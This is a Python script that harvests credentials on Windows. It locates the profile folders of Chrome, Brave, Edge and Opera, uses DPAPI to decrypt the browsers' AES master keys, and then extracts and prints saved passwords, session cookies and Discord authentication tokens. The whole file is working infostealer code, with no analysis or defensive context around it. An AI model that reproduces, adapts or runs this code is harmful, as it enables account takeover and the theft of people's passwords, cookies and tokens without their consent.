import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import tempfile

import win32crypt
from Cryptodome.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

# Find Chrome profile folder if exists
for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
    if i.startswith("Profile "):
        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"

def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass

def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"
    # new method with encryption
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x = x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i = i.replace("\\", "")
            if i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]

    else:  # old method without encryption
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue

    return done

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = loads(f.read())
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            temp_login_db = tempfile.NamedTemporaryFile(delete=False)
            temp_login_db.close()
            copy2(LoginData, temp_login_db.name)
            try:
                with connect(temp_login_db.name) as conn:
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    print(f"\n*** {name} Passwords ***")
                    for logins in cur.fetchall():
                        try:
                            if not logins[0] or not logins[1] or not logins[2]:
                                continue
                            ciphers = logins[2]
                            init_vector = ciphers[3:15]
                            enc_pass = ciphers[15:-16]

                            cipher = generate_cipher(master_key, init_vector)
                            dec_pass = decrypt_payload(cipher, enc_pass).decode()
                            print(f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n")
                        except Exception:
                            pass
            except Exception as e:
                print(f"Failed to read {name} Login Data DB: {e}")
            os.unlink(temp_login_db.name)
        else:
            print(f"{name} Login Data file missing")

        if os.path.exists(CookiesFile):
            temp_cookies_db = tempfile.NamedTemporaryFile(delete=False)
            temp_cookies_db.close()
            copy2(CookiesFile, temp_cookies_db.name)
            try:
                with connect(temp_cookies_db.name) as conn:
                    curr = conn.cursor()
                    curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                    print(f"\n*** {name} Cookies ***")
                    for cookies in curr.fetchall():
                        try:
                            if not cookies[0] or not cookies[1] or not cookies[2]:
                                continue
                            if "google" in cookies[0]:
                                continue
                            ciphers = cookies[2]
                            init_vector = ciphers[3:15]
                            enc_pass = ciphers[15:-16]
                            cipher = generate_cipher(master_key, init_vector)
                            dec_pass = decrypt_payload(cipher, enc_pass).decode()
                            print(f"URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n")
                        except Exception:
                            pass
            except Exception as e:
                print(f"Failed to read {name} Cookies DB: {e}")
            os.unlink(temp_cookies_db.name)
        else:
            print(f"No {name} Cookie file")
    else:
        print(f"{name} Local State file missing")

def Local_State(path):
    return f"{path}\\User Data\\Local State"

def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"

def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"

def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        print(f"\n*** {platform} Tokens ***")
        for i in tokens:
            print(i)

def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
    else:
        print(f"{browser} not installed")

def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()

if __name__ == "__main__":
    main()
